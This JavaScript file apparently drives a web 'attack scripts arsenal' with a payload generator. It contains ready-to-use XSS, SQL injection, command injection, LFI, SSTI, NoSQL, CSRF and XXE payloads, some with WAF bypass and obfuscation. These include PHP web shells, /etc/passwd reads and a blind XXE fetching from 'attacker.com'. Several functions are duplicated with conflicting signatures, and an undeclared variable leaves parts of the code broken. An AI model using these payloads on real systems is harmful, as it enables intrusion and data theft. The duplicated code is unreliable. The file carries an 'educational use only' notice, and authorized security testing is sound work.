// Wolf Attack Scripts Arsenal - Enhanced JavaScript Functionality
// Developed by Tamilselvan

// Global Variables
let bookmarkedScripts = JSON.parse(localStorage.getItem('bookmarkedScripts')) || [];
let searchHistory = JSON.parse(localStorage.getItem('searchHistory')) || [];
let usageStats = JSON.parse(localStorage.getItem('usageStats')) || {
    scriptsViewed: 0,
    scriptsCopied: 0,
    searchesPerformed: 0,
    timeSpent: 0,
    favoriteCategory: '',
    lastVisit: new Date().toISOString()
};

// Initialize on page load
document.addEventListener('DOMContentLoaded', function() {
    initializeApp();
    updateProgressBar();
    loadBookmarks();
    setupEventListeners();
    trackTimeSpent();
    showWelcomeMessage();
});

// Initialize Application
function initializeApp() {
    console.log('🐺 Wolf Attack Scripts Arsenal Initialized');
    
    // Update stats
    usageStats.lastVisit = new Date().toISOString();
    saveUsageStats();
    
    // Setup search functionality
    setupSearch();
    
    // Setup filter functionality
    setupFilters();
    
    // Setup keyboard shortcuts
    setupKeyboardShortcuts();
    
    // Setup responsive features
    setupResponsiveFeatures();
}

// Search Functionality
function setupSearch() {
    const searchInput = document.getElementById('searchInput');
    if (searchInput) {
        searchInput.addEventListener('input', function(e) {
            const query = e.target.value.toLowerCase();
            performSearch(query);
            
            if (query.length > 2) {
                addToSearchHistory(query);
                usageStats.searchesPerformed++;
                saveUsageStats();
            }
        });
    }
}

function performSearch(query) {
    const scriptContainers = document.querySelectorAll('.script-container');
    const categories = document.querySelectorAll('.attack-category');
    
    if (query === '') {
        // Show all scripts
        scriptContainers.forEach(container => {
            container.style.display = 'block';
        });
        categories.forEach(category => {
            category.style.display = 'block';
        });
        return;
    }
    
    let hasResults = false;
    
    categories.forEach(category => {
        let categoryHasResults = false;
        const containers = category.querySelectorAll('.script-container');
        
        containers.forEach(container => {
            const content = container.textContent.toLowerCase();
            if (content.includes(query)) {
                container.style.display = 'block';
                categoryHasResults = true;
                hasResults = true;
                highlightSearchTerm(container, query);
            } else {
                container.style.display = 'none';
            }
        });
        
        category.style.display = categoryHasResults ? 'block' : 'none';
    });
    
    if (!hasResults) {
        showToast('No results found for: ' + query, 'warning');
    }
}

function highlightSearchTerm(container, term) {
    // Remove previous highlights
    const highlighted = container.querySelectorAll('.search-highlight');
    highlighted.forEach(el => {
        el.outerHTML = el.innerHTML;
    });
    
    // Add new highlights
    const content = container.querySelector('.script-content');
    if (content) {
        const regex = new RegExp(`(${term})`, 'gi');
        content.innerHTML = content.innerHTML.replace(regex, '<span class="search-highlight" style="background: yellow; color: black;">$1</span>');
    }
}

// Filter Functionality
function setupFilters() {
    const filterButtons = document.querySelectorAll('.filter-btn');
    filterButtons.forEach(btn => {
        btn.addEventListener('click', function() {
            const filter = this.dataset.filter;
            applyFilter(filter);
            
            // Update active button
            filterButtons.forEach(b => b.classList.remove('active'));
            this.classList.add('active');
        });
    });
}

function applyFilter(filter) {
    const categories = document.querySelectorAll('.attack-category');
    
    if (filter === 'all') {
        categories.forEach(category => {
            category.style.display = 'block';
        });
    } else {
        categories.forEach(category => {
            if (category.id === filter) {
                category.style.display = 'block';
                category.scrollIntoView({ behavior: 'smooth', block: 'start' });
            } else {
                category.style.display = 'none';
            }
        });
    }
    
    updateProgressBar();
}

// Copy Script Functionality - Enhanced
function copyScript(button) {
    showLoading();
    
    const container = button.closest('.script-container');
    const content = container.querySelector('.script-content').textContent;
    
    navigator.clipboard.writeText(content).then(() => {
        showToast('Script copied to clipboard! 📋', 'success');
        usageStats.scriptsCopied++;
        saveUsageStats();
        
        // Add visual feedback
        button.innerHTML = '✅ Copied!';
        button.classList.add('btn-success');
        button.classList.remove('btn-outline-success');
        
        setTimeout(() => {
            button.innerHTML = '📋 Copy All';
            button.classList.remove('btn-success');
            button.classList.add('btn-outline-success');
        }, 2000);
        
    }).catch(err => {
        showToast('Failed to copy script', 'error');
        console.error('Copy failed:', err);
    }).finally(() => {
        hideLoading();
    });
}

// Bookmark Functionality
function toggleBookmark(button) {
    const container = button.closest('.script-container');
    const title = container.querySelector('.script-header h5').textContent;
    const content = container.querySelector('.script-content').textContent;
    
    const scriptData = {
        id: generateId(),
        title: title,
        content: content,
        category: container.closest('.attack-category').id,
        timestamp: new Date().toISOString()
    };
    
    const existingIndex = bookmarkedScripts.findIndex(script => script.title === title);
    
    if (existingIndex > -1) {
        // Remove bookmark
        bookmarkedScripts.splice(existingIndex, 1);
        button.innerHTML = '⭐ Bookmark';
        button.classList.remove('bookmarked');
        showToast('Bookmark removed', 'info');
    } else {
        // Add bookmark
        bookmarkedScripts.push(scriptData);
        button.innerHTML = '⭐ Bookmarked';
        button.classList.add('bookmarked');
        showToast('Script bookmarked! ⭐', 'success');
    }
    
    localStorage.setItem('bookmarkedScripts', JSON.stringify(bookmarkedScripts));
}

function loadBookmarks() {
    const bookmarkButtons = document.querySelectorAll('.bookmark-btn');
    bookmarkButtons.forEach(button => {
        const container = button.closest('.script-container');
        const title = container.querySelector('.script-header h5').textContent;
        
        if (bookmarkedScripts.some(script => script.title === title)) {
            button.innerHTML = '⭐ Bookmarked';
            button.classList.add('bookmarked');
        }
    });
}

// Payload Generator
function showPayloadGenerator() {
    const modal = createPayloadGeneratorModal();
    document.body.appendChild(modal);
    const bootstrapModal = new bootstrap.Modal(modal);
    bootstrapModal.show();
}

function createPayloadGeneratorModal() {
    const modal = document.createElement('div');
    modal.className = 'modal fade';
    modal.id = 'payloadGeneratorModal';
    modal.innerHTML = `
        <div class="modal-dialog modal-lg">
            <div class="modal-content bg-dark text-white">
                <div class="modal-header border-warning">
                    <h5 class="modal-title text-warning">🔧 Advanced Payload Generator</h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <div class="row">
                        <div class="col-md-6">
                            <div class="mb-3">
                                <label class="form-label text-info">Attack Type:</label>
                                <select class="form-select bg-dark text-white border-info" id="attackType">
                                    <option value="xss">XSS (Cross-Site Scripting)</option>
                                    <option value="sqli">SQL Injection</option>
                                    <option value="rce">Remote Code Execution</option>
                                    <option value="lfi">Local File Inclusion</option>
                                    <option value="xxe">XXE (XML External Entity)</option>
                                    <option value="ssti">Server-Side Template Injection</option>
                                    <option value="csrf">Cross-Site Request Forgery</option>
                                    <option value="nosql">NoSQL Injection</option>
                                </select>
                            </div>
                            <div class="mb-3">
                                <label class="form-label text-info">Target Platform:</label>
                                <select class="form-select bg-dark text-white border-info" id="platform">
                                    <option value="generic">Generic</option>
                                    <option value="php">PHP</option>
                                    <option value="asp">ASP.NET</option>
                                    <option value="java">Java</option>
                                    <option value="python">Python</option>
                                    <option value="nodejs">Node.js</option>
                                    <option value="mysql">MySQL</option>
                                    <option value="mssql">MSSQL</option>
                                    <option value="postgresql">PostgreSQL</option>
                                    <option value="oracle">Oracle</option>
                                </select>
                            </div>
                            <div class="mb-3">
                                <label class="form-label text-info">Encoding:</label>
                                <select class="form-select bg-dark text-white border-info" id="encoding">
                                    <option value="none">None</option>
                                    <option value="url">URL Encoding</option>
                                    <option value="html">HTML Encoding</option>
                                    <option value="base64">Base64</option>
                                    <option value="unicode">Unicode</option>
                                    <option value="hex">Hex Encoding</option>
                                </select>
                            </div>
                        </div>
                        <div class="col-md-6">
                            <div class="mb-3">
                                <label class="form-label text-info">Target URL (Optional):</label>
                                <input type="text" class="form-control bg-dark text-white border-info" id="targetUrl" placeholder="https://target.com/vulnerable.php?param=">
                            </div>
                            <div class="mb-3">
                                <label class="form-label text-info">Custom Parameters:</label>
                                <textarea class="form-control bg-dark text-white border-info" id="customParams" rows="3" placeholder="Additional parameters or context"></textarea>
                            </div>
                            <div class="mb-3">
                                <div class="form-check form-switch">
                                    <input class="form-check-input" type="checkbox" id="wafBypass">
                                    <label class="form-check-label text-white">WAF Bypass Mode</label>
                                </div>
                                <div class="form-check form-switch">
                                    <input class="form-check-input" type="checkbox" id="obfuscation">
                                    <label class="form-check-label text-white">Obfuscation</label>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="mb-3">
                        <label class="form-label text-success">Generated Payload:</label>
                        <textarea class="form-control bg-black text-success border-success" id="generatedPayload" rows="6" readonly placeholder="Generated payload will appear here..."></textarea>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-outline-warning" onclick="generatePayload()">🔧 Generate</button>
                    <button type="button" class="btn btn-outline-success" onclick="copyGeneratedPayload()">📋 Copy</button>
                    <button type="button" class="btn btn-outline-info" onclick="testPayload()">🧪 Test</button>
                    <button type="button" class="btn btn-outline-primary" onclick="savePayload()">💾 Save</button>
                </div>
            </div>
        </div>
    `;
    return modal;
}

function generatePayload() {
    showLoading();
    
    const attackType = document.getElementById('attackType').value;
    const targetUrl = document.getElementById('targetUrl').value;
    const encoding = document.getElementById('encoding').value;
    const platform = document.getElementById('platform').value;
    const wafBypass = document.getElementById('wafBypass').checked;
    const obfuscation = document.getElementById('obfuscation').checked;
    const customParams = document.getElementById('customParams').value;
    
    let payload = generateCustomPayload(attackType, targetUrl, encoding, platform, wafBypass, obfuscation, customParams);
    
    document.getElementById('generatedPayload').value = payload;
    
    showToast('Payload generated successfully! 🔧', 'success');
    hideLoading();
}

function generateCustomPayload(type, url, encoding, platform, wafBypass, obfuscation, customParams) {
    let payload = '';
    
    switch(type) {
        case 'xss':
            payload = generateXSSPayload(platform, wafBypass, obfuscation);
            break;
        case 'sqli':
            payload = generateSQLPayload(platform, wafBypass);
            break;
        case 'rce':
            payload = generateRCEPayload(platform, wafBypass);
            break;
        case 'lfi':
            payload = generateLFIPayload(platform, wafBypass);
            break;
        case 'xxe':
            payload = generateXXEPayload(wafBypass);
            break;
        case 'ssti':
            payload = generateSSTIPayload(platform, wafBypass);
            break;
        case 'csrf':
            payload = generateCSRFPayload(url);
            break;
        case 'nosql':
            payload = generateNoSQLPayload(wafBypass);
            break;
        default:
            payload = `Generic payload for ${type}`;
    }
    
    // Apply custom parameters
    if (customParams) {
        payload += `\n\n/* Custom Parameters: ${customParams} */`;
    }
    
    // Apply encoding
    if (encoding !== 'none') {
        payload = applyPayloadEncoding(payload, encoding);
    }
    
    // Add URL if provided
    if (url && !url.includes('payload')) {
        payload = `${url}${encodeURIComponent(payload)}`;
    }
    
    return payload;
}

function generateXSSPayload(platform, wafBypass, obfuscation) {
    const basicPayloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        'javascript:alert("XSS")'
    ];
    
    const wafBypassPayloads = [
        '<ScRiPt>alert("XSS")</ScRiPt>',
        '<script>alert(String.fromCharCode(88,83,83))</script>',
        '<svg/onload=alert(/XSS/)>',
        'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'
    ];
    
    const obfuscatedPayloads = [
        '<script>eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))</script>',
        '<script>window["alert"]("XSS")</script>',
        '<script>(alert)("XSS")</script>'
    ];
    
    let payloads = basicPayloads;
    if (wafBypass) payloads = payloads.concat(wafBypassPayloads);
    if (obfuscation) payloads = payloads.concat(obfuscatedPayloads);
    
    return payloads[Math.floor(Math.random() * payloads.length)];
}

function generateSQLPayload(platform, wafBypass) {
    const basicPayloads = {
        mysql: [
            "' OR '1'='1",
            "' UNION SELECT 1,2,3,version(),database(),user()--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe"
        ],
        mssql: [
            "'; SELECT @@version,DB_NAME(),SYSTEM_USER--",
            "' UNION SELECT 1,2,3,4; WAITFOR DELAY '0:0:5'--"
        ],
        postgresql: [
            "' UNION SELECT version(),current_database(),current_user--",
            "'; SELECT pg_sleep(5)--"
        ],
        oracle: [
            "' UNION SELECT banner,1,2 FROM v$version--",
            "' AND (SELECT COUNT(*) FROM dual WHERE ROWNUM<=1 AND (SELECT LENGTH(user) FROM dual)>0)>0--"
        ]
    };
    
    const wafBypassPayloads = [
        "/**/UNION/**/SELECT/**/1,2,3--",
        "' /*!UNION*/ /*!SELECT*/ 1,2,3--",
        "' %55NION %53ELECT 1,2,3--"
    ];
    
    let payloads = basicPayloads[platform] || basicPayloads.mysql;
    if (wafBypass) payloads = payloads.concat(wafBypassPayloads);
    
    return payloads[Math.floor(Math.random() * payloads.length)];
}

function generateRCEPayload(platform, wafBypass) {
    const payloads = {
        php: [
            '<?php system($_GET["cmd"]); ?>',
            '<?php exec($_GET["cmd"]); ?>',
            '<?php shell_exec($_GET["cmd"]); ?>',
            '<?php passthru($_GET["cmd"]); ?>'
        ],
        python: [
            '__import__("os").system("whoami")',
            'exec("__import__(\'os\').system(\'whoami\')")',
            'eval("__import__(\'os\').system(\'whoami\')")'
        ],
        java: [
            'Runtime.getRuntime().exec("whoami");',
            'new ProcessBuilder("whoami").start();'
        ],
        nodejs: [
            'require("child_process").exec("whoami");',
            'process.binding("spawn_sync").spawn({file:"whoami",args:[],stdio:[{type:"pipe",readable:true,writable:false}]});'
        ]
    };
    
    const commandInjection = [
        '; whoami',
        '| whoami',
        '&& whoami',
        '|| whoami',
        '`whoami`',
        '$(whoami)'
    ];
    
    let selectedPayloads = payloads[platform] || commandInjection;
    if (wafBypass) {
        selectedPayloads = selectedPayloads.concat([
            '; w`h`o`a`m`i',
            '; wh$()oami',
            '; /bin/cat /etc/passwd'
        ]);
    }
    
    return selectedPayloads[Math.floor(Math.random() * selectedPayloads.length)];
}

function generateLFIPayload(platform, wafBypass) {
    const basicPayloads = [
        '../../../etc/passwd',
        '../../../etc/shadow',
        '../../../var/log/apache2/access.log',
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
        'C:\\Windows\\win.ini'
    ];
    
    const phpWrappers = [
        'php://filter/convert.base64-encode/resource=index.php',
        'php://filter/read=string.rot13/resource=index.php',
        'data://text/plain,<?php system($_GET["cmd"]); ?>',
        'php://input'
    ];
    
    const wafBypassPayloads = [
        '....//....//....//etc/passwd',
        '..%2f..%2f..%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd'
    ];
    
    let payloads = basicPayloads;
    if (platform === 'php') payloads = payloads.concat(phpWrappers);
    if (wafBypass) payloads = payloads.concat(wafBypassPayloads);
    
    return payloads[Math.floor(Math.random() * payloads.length)];
}

function generateXXEPayload(wafBypass) {
    const basicPayload = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>`;
    
    const blindXXE = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">
%remote;
]>
<root></root>`;
    
    return wafBypass ? blindXXE : basicPayload;
}

function generateSSTIPayload(platform, wafBypass) {
    const payloads = {
        python: [
            '{{7*7}}',
            '{{config}}',
            '{{"".__class__.__mro__[2].__subclasses__()}}',
            '{{request.__class__.__mro__[8].__subclasses__()[104].__init__.__globals__["sys"].modules["os"].popen("whoami").read()}}'
        ],
        php: [
            '{{7*7}}',
            '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}',
            '{{["id"]|filter("system")}}'
        ],
        java: [
            '${7*7}',
            '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("whoami") }',
            '#set($ex=$rt.getRuntime().exec("whoami"))'
        ]
    };
    
    let selectedPayloads = payloads[platform] || payloads.python;
    return selectedPayloads[Math.floor(Math.random() * selectedPayloads.length)];
}

function generateCSRFPayload(url) {
    return `<html>
<body onload="document.forms[0].submit()">
<form action="${url || 'http://target.com/action'}" method="POST">
<input type="hidden" name="param1" value="malicious_value" />
<input type="hidden" name="param2" value="csrf_attack" />
</form>
</body>
</html>`;
}

function generateNoSQLPayload(wafBypass) {
    const basicPayloads = [
        '{"username": {"$ne": null}, "password": {"$ne": null}}',
        '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
        '{"$where": "this.username == \'admin\' || \'1\' == \'1\'"}',
        '{"username": {"$regex": ".*"}}'
    ];
    
    const advancedPayloads = [
        '{"$where": "sleep(5000) || true"}',
        '{"username": {"$where": "if (this.username == \'admin\') sleep(5000); return true;"}}'
    ];
    
    let payloads = basicPayloads;
    if (wafBypass) payloads = payloads.concat(advancedPayloads);
    
    return payloads[Math.floor(Math.random() * payloads.length)];
}

function applyPayloadEncoding(payload, encoding) {
    switch (encoding) {
        case 'url':
            return encodeURIComponent(payload);
        case 'html':
            return payload.replace(/[<>&"']/g, function(match) {
                const htmlEntities = {
                    '<': '&lt;',
                    '>': '&gt;',
                    '&': '&amp;',
                    '"': '&quot;',
                    "'": '&#39;'
                };
                return htmlEntities[match];
            });
        case 'base64':
            return btoa(payload);
        case 'unicode':
            return payload.split('').map(char => 
                '\\u' + ('0000' + char.charCodeAt(0).toString(16)).slice(-4)
            ).join('');
        case 'hex':
            return payload.split('').map(char => 
                '\\x' + char.charCodeAt(0).toString(16).padStart(2, '0')
            ).join('');
        default:
            return payload;
    }
}

function copyGeneratedPayload() {
    const payload = document.getElementById('generatedPayload').value;
    if (payload) {
        navigator.clipboard.writeText(payload).then(() => {
            showToast('Generated payload copied! 📋', 'success');
        }).catch(() => {
            showToast('Failed to copy payload', 'error');
        });
    } else {
        showToast('No payload to copy. Generate one first!', 'warning');
    }
}

// Export Functionality
function exportAllScripts() {
    showLoading();
    
    const scripts = [];
    const containers = document.querySelectorAll('.script-container');
    
    containers.forEach(container => {
        const title = container.querySelector('.script-header h5').textContent;
        const content = container.querySelector('.script-content').textContent;
        const category = container.closest('.attack-category').id;
        const severity = container.querySelector('.badge').textContent;
        
        scripts.push({
            title: title,
            content: content,
            category: category,
            severity: severity,
            exported: new Date().toISOString()
        });
    });
    
    const exportData = {
        metadata: {
            tool: 'Wolf Attack Scripts Arsenal',
            version: '2.0',
            exported: new Date().toISOString(),
            totalScripts: scripts.length,
            developer: 'Tamilselvan'
        },
        scripts: scripts,
        bookmarks: bookmarkedScripts,
        stats: usageStats
    };
    
    const blob = new Blob([JSON.stringify(exportData, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `wolf-attack-scripts-${new Date().toISOString().split('T')[0]}.json`;
    a.click();
    URL.revokeObjectURL(url);
    
    showToast('All scripts exported successfully! 📥', 'success');
    hideLoading();
}

// Statistics
function showScriptStats() {
    const totalScripts = document.querySelectorAll('.script-container').length;
    const totalCategories = document.querySelectorAll('.attack-category').length;
    
    const modal = createStatsModal(totalScripts, totalCategories);
    document.body.appendChild(modal);
    const bootstrapModal = new bootstrap.Modal(modal);
    bootstrapModal.show();
}

function createStatsModal(totalScripts, totalCategories) {
    const modal = document.createElement('div');
    modal.className = 'modal fade';
    modal.id = 'statsModal';
    modal.innerHTML = `
        <div class="modal-dialog modal-lg">
            <div class="modal-content bg-dark text-white">
                <div class="modal-header border-info">
                    <h5 class="modal-title text-info">📊 Usage Statistics</h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <div class="row">
                        <div class="col-md-6">
                            <h6 class="text-warning">Script Statistics:</h6>
                            <ul class="list-unstyled">
                                <li>📜 Total Scripts: <span class="text-success">${totalScripts}</span></li>
                                <li>📂 Categories: <span class="text-success">${totalCategories}</span></li>
                                <li>📋 Scripts Copied: <span class="text-success">${usageStats.scriptsCopied}</span></li>
                                <li>👀 Scripts Viewed: <span class="text-success">${usageStats.scriptsViewed}</span></li>
                                <li>🔍 Searches: <span class="text-success">${usageStats.searchesPerformed}</span></li>
                            </ul>
                        </div>
                        <div class="col-md-6">
                            <h6 class="text-warning">Session Info:</h6>
                            <ul class="list-unstyled">
                                <li>⏰ Time Spent: <span class="text-success">${Math.round(usageStats.timeSpent / 60)} minutes</span></li>
                                <li>⭐ Bookmarks: <span class="text-success">${bookmarkedScripts.length}</span></li>
                                <li>🔍 Search History: <span class="text-success">${searchHistory.length}</span></li>
                                <li>📅 Last Visit: <span class="text-success">${new Date(usageStats.lastVisit).toLocaleDateString()}</span></li>
                            </ul>
                        </div>
                    </div>
                    <div class="mt-3">
                        <h6 class="text-warning">Recent Searches:</h6>
                        <div class="d-flex flex-wrap gap-2">
                            ${searchHistory.slice(-10).map(term => `<span class="badge bg-secondary">${term}</span>`).join('')}
                        </div>
                    </div>
                    <div class="mt-3">
                        <h6 class="text-warning">🏆 Achievements:</h6>
                        <div class="d-flex flex-wrap gap-2">
                            ${usageStats.scriptsCopied >= 10 ? '<span class="badge bg-success">🎯 Script Master</span>' : ''}
                            ${totalCategories >= 5 ? '<span class="badge bg-info">🔍 Explorer</span>' : ''}
                            ${Math.round(usageStats.timeSpent / 60) >= 15 ? '<span class="badge bg-warning">⏰ Dedicated</span>' : ''}
                            ${usageStats.scriptsCopied >= 50 ? '<span class="badge bg-danger">🚀 Power User</span>' : ''}
                            ${bookmarkedScripts.length >= 5 ? '<span class="badge bg-primary">⭐ Collector</span>' : ''}
                        </div>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-outline-danger" onclick="clearStats()">🗑️ Clear Stats</button>
                    <button type="button" class="btn btn-outline-success" onclick="exportStats()">📊 Export Stats</button>
                </div>
            </div>
        </div>
    `;
    return modal;
}

// Help System
function showHelp() {
    const modal = createHelpModal();
    document.body.appendChild(modal);
    const bootstrapModal = new bootstrap.Modal(modal);
    bootstrapModal.show();
}

function createHelpModal() {
    const modal = document.createElement('div');
    modal.className = 'modal fade';
    modal.id = 'helpModal';
    modal.innerHTML = `
        <div class="modal-dialog modal-xl">
            <div class="modal-content bg-dark text-white">
                <div class="modal-header border-danger">
                    <h5 class="modal-title text-danger">❓ Wolf Attack Scripts Arsenal - Help</h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <div class="row">
                        <div class="col-md-6">
                            <h6 class="text-warning">🚀 Features:</h6>
                            <ul class="list-unstyled">
                                <li>📋 <strong>Copy Scripts:</strong> Click copy button to copy payloads</li>
                                <li>⭐ <strong>Bookmarks:</strong> Save favorite scripts for quick access</li>
                                <li>🔍 <strong>Search:</strong> Real-time search across all scripts</li>
                                <li>🔧 <strong>Generator:</strong> Create custom payloads</li>
                                <li>📊 <strong>Statistics:</strong> Track your usage patterns</li>
                                <li>📥 <strong>Export:</strong> Download all scripts as JSON</li>
                            </ul>
                            
                            <h6 class="text-warning">⌨️ Keyboard Shortcuts:</h6>
                            <ul class="list-unstyled">
                                <li><kbd>Ctrl+F</kbd> - Search scripts</li>
                                <li><kbd>Ctrl+E</kbd> - Export all scripts</li>
                                <li><kbd>Ctrl+G</kbd> - Open payload generator</li>
                                <li><kbd>Ctrl+S</kbd> - Show statistics</li>
                                <li><kbd>Ctrl+H</kbd> - Show help</li>
                                <li><kbd>Esc</kbd> - Clear search</li>
                            </ul>
                        </div>
                        <div class="col-md-6">
                            <h6 class="text-warning">🎯 Attack Categories:</h6>
                            <ul class="list-unstyled">
                                <li>🚨 <strong>XSS:</strong> Cross-Site Scripting attacks</li>
                                <li>💉 <strong>SQL Injection:</strong> Database attacks</li>
                                <li>💻 <strong>RCE:</strong> Remote Code Execution</li>
                                <li>📁 <strong>LFI:</strong> Local File Inclusion</li>
                                <li>🔥 <strong>XXE:</strong> XML External Entity</li>
                                <li>🎭 <strong>CSRF:</strong> Cross-Site Request Forgery</li>
                                <li>🔧 <strong>SSTI:</strong> Server-Side Template Injection</li>
                                <li>🍃 <strong>NoSQL:</strong> NoSQL Injection</li>
                                <li>🚀 <strong>Advanced:</strong> Polyglot payloads</li>
                            </ul>
                            
                            <h6 class="text-warning">⚠️ Important Notes:</h6>
                            <div class="alert alert-warning">
                                <strong>Educational Use Only!</strong><br>
                                These scripts are for authorized testing and educational purposes only. 
                                Always obtain proper permission before testing.
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    `;
    return modal;
}

// Copy script function
function copyScript(button) {
    const scriptContainer = button.closest('.script-container');
    const scriptContent = scriptContainer.querySelector('.script-content');
    const text = scriptContent.textContent.trim();
    
    // Copy to clipboard
    navigator.clipboard.writeText(text).then(() => {
        // Update button temporarily
        const originalText = button.innerHTML;
        button.innerHTML = '✅ Copied!';
        button.classList.remove('btn-outline-success');
        button.classList.add('btn-success');
        
        setTimeout(() => {
            button.innerHTML = originalText;
            button.classList.remove('btn-success');
            button.classList.add('btn-outline-success');
        }, 2000);
        
        // Update stats
        scriptStats.totalCopied++;
        updatePayloadUsage(scriptContainer);
        
        // Show notification
        showNotification('📋 Script copied to clipboard!', 'success');
        
        // Log activity
        console.log('🐺 Script copied:', scriptContainer.querySelector('.script-header h5').textContent);
        
    }).catch(err => {
        console.error('Failed to copy: ', err);
        showNotification('❌ Failed to copy script', 'error');
    });
}

// Update payload usage statistics
function updatePayloadUsage(container) {
    const category = container.closest('.attack-category').id;
    const scriptType = container.querySelector('.script-header h5').textContent;
    
    if (!scriptStats.payloadUsage[category]) {
        scriptStats.payloadUsage[category] = 0;
    }
    scriptStats.payloadUsage[category]++;
    
    // Update most used category
    let maxUsage = 0;
    let mostUsed = '';
    for (const [cat, usage] of Object.entries(scriptStats.payloadUsage)) {
        if (usage > maxUsage) {
            maxUsage = usage;
            mostUsed = cat;
        }
    }
    scriptStats.mostUsedCategory = mostUsed;
}

// Show notification
function showNotification(message, type = 'info') {
    const notification = document.createElement('div');
    notification.className = `alert alert-${type === 'error' ? 'danger' : 'success'} alert-dismissible fade show position-fixed`;
    notification.style.cssText = 'top: 100px; right: 20px; z-index: 9999; min-width: 300px;';
    notification.innerHTML = `
        ${message}
        <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
    `;
    document.body.appendChild(notification);
    
    setTimeout(() => {
        if (notification.parentNode) {
            notification.remove();
        }
    }, 3000);
}

// Export all scripts
function exportAllScripts() {
    const allScripts = {};
    const categories = document.querySelectorAll('.attack-category');
    
    categories.forEach(category => {
        const categoryName = category.id;
        const categoryTitle = category.querySelector('h2').textContent;
        allScripts[categoryName] = {
            title: categoryTitle,
            scripts: []
        };
        
        const scriptContainers = category.querySelectorAll('.script-container');
        scriptContainers.forEach(container => {
            const title = container.querySelector('.script-header h5').textContent;
            const content = container.querySelector('.script-content').textContent.trim();
            const severity = container.querySelector('.badge').textContent;
            
            allScripts[categoryName].scripts.push({
                title: title,
                content: content,
                severity: severity
            });
        });
    });
    
    const exportData = {
        title: 'Wolf Attack Scripts Arsenal',
        exportDate: new Date().toISOString(),
        developer: 'Tamilselvan',
        categories: allScripts,
        stats: scriptStats
    };
    
    const jsonData = JSON.stringify(exportData, null, 2);
    const blob = new Blob([jsonData], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    
    const a = document.createElement('a');
    a.href = url;
    a.download = `wolf-attack-scripts-${Date.now()}.json`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    
    showNotification('📥 All scripts exported successfully!', 'success');
    console.log('🐺 All attack scripts exported');
}

// Show payload generator modal
function showPayloadGenerator() {
    const modal = new bootstrap.Modal(document.getElementById('payloadGeneratorModal'));
    modal.show();
}

// Generate custom payload
function generatePayload() {
    const attackType = document.getElementById('attackType').value;
    const targetUrl = document.getElementById('targetUrl').value;
    const encoding = document.getElementById('encoding').value;
    
    let payload = '';
    
    // Generate payload based on attack type
    switch (attackType) {
        case 'xss':
            payload = generateXSSPayload(targetUrl);
            break;
        case 'sqli':
            payload = generateSQLiPayload(targetUrl);
            break;
        case 'rce':
            payload = generateRCEPayload(targetUrl);
            break;
        case 'lfi':
            payload = generateLFIPayload(targetUrl);
            break;
        case 'xxe':
            payload = generateXXEPayload();
            break;
        case 'ssti':
            payload = generateSSTIPayload();
            break;
        default:
            payload = 'Select an attack type to generate payload';
    }
    
    // Apply encoding
    payload = applyEncoding(payload, encoding);
    
    document.getElementById('generatedPayload').value = payload;
    showNotification('🔧 Payload generated successfully!', 'success');
}

// Generate XSS payload
function generateXSSPayload(targetUrl) {
    const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        'javascript:alert("XSS")',
        '"><script>alert("XSS")</script>',
        '\';alert("XSS");//'
    ];
    
    const randomPayload = xssPayloads[Math.floor(Math.random() * xssPayloads.length)];
    return targetUrl ? `${targetUrl}${encodeURIComponent(randomPayload)}` : randomPayload;
}

// Generate SQL injection payload
function generateSQLiPayload(targetUrl) {
    const sqliPayloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "' UNION SELECT 1,2,3--",
        "'; DROP TABLE users;--",
        "' OR 1=1 LIMIT 1--",
        "') OR ('1'='1"
    ];
    
    const randomPayload = sqliPayloads[Math.floor(Math.random() * sqliPayloads.length)];
    return targetUrl ? `${targetUrl}${encodeURIComponent(randomPayload)}` : randomPayload;
}

// Generate RCE payload
function generateRCEPayload(targetUrl) {
    const rcePayloads = [
        '; whoami',
        '| whoami',
        '&& whoami',
        '`whoami`',
        '$(whoami)',
        '; cat /etc/passwd'
    ];
    
    const randomPayload = rcePayloads[Math.floor(Math.random() * rcePayloads.length)];
    return targetUrl ? `${targetUrl}${encodeURIComponent(randomPayload)}` : randomPayload;
}

// Generate LFI payload
function generateLFIPayload(targetUrl) {
    const lfiPayloads = [
        '../../../etc/passwd',
        '....//....//....//etc/passwd',
        '..%2f..%2f..%2fetc%2fpasswd',
        'php://filter/convert.base64-encode/resource=index.php',
        '/var/log/apache2/access.log',
        'C:\\Windows\\System32\\drivers\\etc\\hosts'
    ];
    
    const randomPayload = lfiPayloads[Math.floor(Math.random() * lfiPayloads.length)];
    return targetUrl ? `${targetUrl}${encodeURIComponent(randomPayload)}` : randomPayload;
}

